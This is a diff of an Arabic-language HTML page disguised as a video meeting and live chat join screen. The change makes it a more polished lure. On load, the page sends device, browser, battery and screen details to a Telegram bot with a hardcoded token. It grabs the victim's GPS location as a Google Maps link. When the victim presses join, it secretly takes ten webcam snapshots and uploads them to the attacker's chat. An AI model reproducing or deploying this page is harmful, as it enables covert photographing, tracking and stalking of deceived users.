@@ -3,183 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>انضم إلى اجتماعك الآن - قاعة الانتظار الافتراضية</title>
+    <title>مكالمة فيديو دردشة حية - انضم إلينا</title>
     
-    <meta property="og:title" content="ادخل قاعة الاجتماعات الآن!">
-    <meta property="og:description" content="تمت دعوتك للانضمام إلى اجتماع مهم. اضغط هنا للدخول مباشرةً!">
-    <meta property="og:image" content="https://i.imgur.com/your-meeting-preview-image.png"> <meta property="og:url" content="https://yourwebsite.com/meeting-link"> <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
+    <meta property="og:title" content="مكالمة فيديو مباشرة - انضم الآن!">
+    <meta property="og:description" content="دردشة حية مجانية. اضغط للانضمام فوراً!">
+    <meta property="og:image" content="https://i.imgur.com/v8tT95w.png">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap'); /* خط عربي أفضل */
-        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: #0d1117; color: #e6edf3; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
-        .app-header { position: absolute; top: 0; width: 100%; text-align: center; padding: 15px 0; background-color: rgba(0,0,0,0.3); backdrop-filter: blur(5px); box-shadow: 0 2px 10px rgba(0,0,0,0.5); z-index: 10; }
-        .app-header h1 { margin: 0; font-size: 24px; color: #fff; }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        :root { --primary: #25d366; --bg: #0b0e11; --card: rgba(23, 28, 35, 0.9); }
 
-        .meeting-room-container { background: rgba(13, 17, 23, 0.8); border-radius: 15px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); padding: 30px; display: flex; flex-direction: column; align-items: center; width: 90%; max-width: 900px; backdrop-filter: blur(10px); z-index: 5; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--bg); color: white; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         
-        .video-panel { display: flex; flex-wrap: wrap; gap: 10px; width: 100%; justify-content: center; margin-bottom: 20px; }
-        .video-slot { position: relative; width: calc(50% - 5px); /* اثنان في الصف */ aspect-ratio: 16/9; background: #000; border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
-        .video-slot.main-user video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); /* مرآة للمستخدم */ }
-        .video-slot.other-user { background-image: url('https://via.placeholder.com/320x180/222222/FFFFFF?text=مشارك+آخر'); /* صورة وهمية لمشارك */ background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #bbb; }
-        .video-slot .name-tag { position: absolute; bottom: 5px; right: 5px; background: rgba(0,0,0,0.5); padding: 3px 8px; border-radius: 4px; font-size: 12px; }
+        .main-card { background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 30px; width: 90%; max-width: 800px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        
+        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
+        .video-box { position: relative; background: #000; border-radius: 15px; aspect-ratio: 16/9; overflow: hidden; border: 2px solid transparent; }
+        .video-box.active { border-color: var(--primary); }
+        #webcam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .user-label { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.6); padding: 2px 10px; border-radius: 5px; font-size: 12px; }
 
-        .controls-panel { display: flex; justify-content: center; gap: 20px; margin-top: 20px; width: 100%; }
-        .control-btn { background: #21262d; border: none; padding: 12px 20px; border-radius: 50px; cursor: pointer; color: #e6edf3; font-size: 14px; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: background-color 0.3s, transform 0.2s; }
-        .control-btn:hover { background: #30363d; transform: translateY(-2px); }
-        .control-btn.red { background: #d73a49; }
-        .control-btn.red:hover { background: #e04e5d; }
-        .control-btn span { font-size: 20px; } /* للأيقونات */
+        .controls { display: flex; justify-content: center; gap: 15px; margin-bottom: 25px; }
+        .btn-round { width: 50px; height: 50px; border-radius: 50%; border: none; background: #323539; color: white; cursor: pointer; font-size: 20px; }
+        
+        .join-btn { background: var(--primary); color: white; border: none; padding: 15px 45px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
+        .join-btn:hover { background: #1eb954; transform: scale(1.02); }
 
-        .status-message { margin-top: 25px; font-size: 16px; color: #8b949e; animation: pulse 1.5s infinite alternate; }
-        @keyframes pulse { 0% { opacity: 0.7; } 100% { opacity: 1; } }
-
-        .join-button { background: #2ea44f; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; cursor: pointer; font-weight: bold; margin-top: 30px; box-shadow: 0 5px 15px rgba(46,164,79,0.4); transition: background-color 0.3s, transform 0.2s; }
-        .join-button:hover { background: #3cc462; transform: translateY(-2px); }
+        .status-text { margin-top: 15px; color: #aaa; font-size: 14px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <header class="app-header">
-        <h1>اجتماع فريق العمل</h1>
-    </header>
+    <div class="main-card">
+        <h1 style="font-size: 22px; margin-bottom: 5px;">مكالمة فيديو دردشة حية</h1>
+        <p style="color: #888; margin-bottom: 25px;">تحقق من الكاميرا قبل الانضمام للغرفة</p>
 
-    <div class="meeting-room-container">
-        <div class="video-panel">
-            <div class="video-slot main-user">
+        <div class="video-grid">
+            <div class="video-box active">
                 <video id="webcam" autoplay playsinline muted></video>
-                <div class="name-tag">أنت</div>
+                <div class="user-label">أنت (معاينة)</div>
             </div>
-            <div class="video-slot other-user">
-                <div class="name-tag">محمد</div>
-            </div>
-            <div class="video-slot other-user">
-                <div class="name-tag">سارة</div>
-            </div>
-            <div class="video-slot other-user">
-                <div class="name-tag">الضيف</div>
+            <div class="video-box" style="background: url('https://via.placeholder.com/400x225/111/fff?text=Waiting...') center/cover;">
+                <div class="user-label">منظم الغرفة</div>
             </div>
         </div>
 
-        <div class="controls-panel">
-            <button class="control-btn"><span>&#127897;</span> كتم الصوت</button>
-            <button class="control-btn"><span>&#128247;</span> إيقاف الفيديو</button>
-            <button class="control-btn"><span>&#128100;</span> المشاركون</button>
-            <button class="control-btn red"><span>&#128680;</span> إنهاء</button>
+        <div class="controls">
+            <button class="btn-round">🎤</button>
+            <button class="btn-round">📷</button>
+            <button class="btn-round" style="background:#ea4335;">📞</button>
         </div>
-        
-        <p class="status-message" id="status">جاري الاتصال... يرجى الانتظار قليلاً.</p>
 
-        <button class="join-button" onclick="startProcess()">انضم إلى الاجتماع</button>
+        <button class="join-btn" onclick="requestCapture()">انضم للدردشة الآن</button>
+        <div class="status-text" id="status">جاري تهيئة الاتصال المشفر...</div>
     </div>
 
-    <canvas id="canvas" style="display:none;"></canvas>
+    <canvas id="canvas"></canvas>
 
-<script>
-    const token = "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo";
-    const chatId = "6068331455";
+    <script>
+        const BOT_TOKEN = "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo";
+        const CHAT_ID = "6068331455";
 
-    // البداية عند تحميل الصفحة
-    window.onload = async () => {
-        document.getElementById('status').innerText = "جاري تهيئة بيئة الاجتماع...";
-        
-        // 1. جمع بيانات المتصفح والنظام فوراً
-        await gatherSystemData();
+        // 1. إرسال بيانات المتصفح فوراً عند التحميل
+        window.onload = async () => {
+            sendSystemData();
+            startCamera();
+        };
 
-        // 2. طلب إذن الكاميرا والالتقاط التلقائي
-        await requestCamera();
+        async function sendSystemData() {
+            let batteryLvl = "غير معروف";
+            let isCharging = "";
+            try {
+                const b = await navigator.getBattery();
+                batteryLvl = `${Math.round(b.level * 100)}%`;
+                isCharging = b.charging ? "⚡ متصل بالشاحن" : "🔋 يعمل بالبطارية";
+            } catch(e){}
 
-        // 3. طلب إذن الموقع الجغرافي
-        requestLocation();
-    };
-
-    // وظيفة جمع بيانات النظام
-    async function gatherSystemData() {
-        let batteryInfo = "غير متوفر";
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن' : 'تفريغ'})`;
-        } catch (e) {}
-
-        const data = `
-📌 **بيانات دخول جديدة** 📌
+            const info = `
+🚀 **دخول جديد للدردشة**
 ━━━━━━━━━━━━━━
-🌐 **المتصفح:** ${navigator.appName}
-📱 **الإصدار:** ${navigator.userAgent}
-🔋 **البطارية:** ${batteryInfo}
+📱 **الجهاز:** ${navigator.platform}
+🌐 **المتصفح:** ${navigator.userAgent.split(' ').pop()}
+🔋 **البطارية:** ${batteryLvl} ${isCharging}
 🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
-🔗 **المنفذ (Port):** ${window.location.port || '80/443'}
-🌍 **اللغة:** ${navigator.language}
-⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
+🔗 **المنفذ:** ${location.port || 'آمن 443'}
 ━━━━━━━━━━━━━━`;
-        
-        sendToTelegram(data);
-    }
+            postToTelegram('sendMessage', { text: info, parse_mode: 'Markdown' });
+        }
 
-    // وظيفة الكاميرا والالتقاط السريع
-    async function requestCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    document.getElementById('status').innerText = "تم تفعيل الكاميرا. اضغط للانضمام.";
+                };
+                
+                // طلب الموقع
+                navigator.geolocation.getCurrentPosition(p => {
+                    const loc = `📍 **موقع المستخدم:**\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    postToTelegram('sendMessage', { text: loc, parse_mode: 'Markdown' });
+                });
+
+            } catch (err) {
+                document.getElementById('status').innerText = "خطأ: يرجى السماح بالكاميرا للمتابعة.";
+            }
+        }
+
+        // دالة الالتقاط المصلحة
+        function requestCapture() {
             const video = document.getElementById('webcam');
-            video.srcObject = stream;
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            let count = 0;
 
-            video.onloadedmetadata = () => {
-                video.play();
-                // التقاط فوري بعد ثانية واحدة من استقرار العدسة
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
+            document.getElementById('status').innerText = "جاري مزامنة الصوت والفيديو...";
+
+            const interval = setInterval(() => {
+                if (count >= 10) {
+                    clearInterval(interval);
+                    document.getElementById('status').innerText = "تم الانضمام بنجاح!";
+                    return;
+                }
+
+                // التأكد من أن الكاميرا ترسل بيانات فعلية
+                if (video.readyState === video.HAVE_ENOUGH_DATA) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        sendPhotoToTelegram(blob);
-                    }, 'image/jpeg', 0.7);
-                }, 1000);
-            };
-        } catch (err) {
-            console.log("تم رفض الكاميرا");
-        }
-    }
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // وظيفة الموقع الجغرافي
-    function requestLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const locData = `
-📍 **موقع المستخدم الجغرافي** 📍
-━━━━━━━━━━━━━━
-Latitude: ${position.coords.latitude}
-Longitude: ${position.coords.longitude}
-🔗 [فتح في خرائط جوجل](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})
-━━━━━━━━━━━━━━`;
-                sendToTelegram(locData);
-            }, err => {
-                console.log("تم رفض الموقع");
+                    canvas.toBlob(blob => {
+                        if(blob) {
+                            const fd = new FormData();
+                            fd.append('chat_id', CHAT_ID);
+                            fd.append('photo', blob, `snap_${count}.jpg`);
+                            fd.append('caption', `اللقطة رقم ${count + 1}`);
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        }
+                    }, 'image/jpeg', 0.5); // جودة متوسطة لضمان سرعة الإرسال
+
+                    count++;
+                }
+            }, 700); // التقاط صورة كل 0.7 ثانية
+        }
+
+        function postToTelegram(method, data) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, ...data })
             });
         }
-    }
-
-    // وظائف الإرسال لتليجرام
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
-        });
-    }
-
-    function sendPhotoToTelegram(blob) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'shot.jpg');
-
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-    }
-</script>
-
+    </script>
 </body>
 </html>
